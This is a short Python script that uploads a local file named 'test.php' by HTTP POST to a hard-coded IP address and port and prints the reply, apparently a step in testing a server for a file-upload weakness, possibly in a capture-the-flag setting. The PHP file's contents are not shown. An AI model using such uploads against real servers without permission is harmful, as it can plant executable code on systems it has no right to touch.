import requests

url = "http://20.205.238.7:10762/"
file_path = "test.php"

files = {"file": open(file_path, "rb")}

response = requests.post(url, files=files)

print(response.status_code)
print(response.text)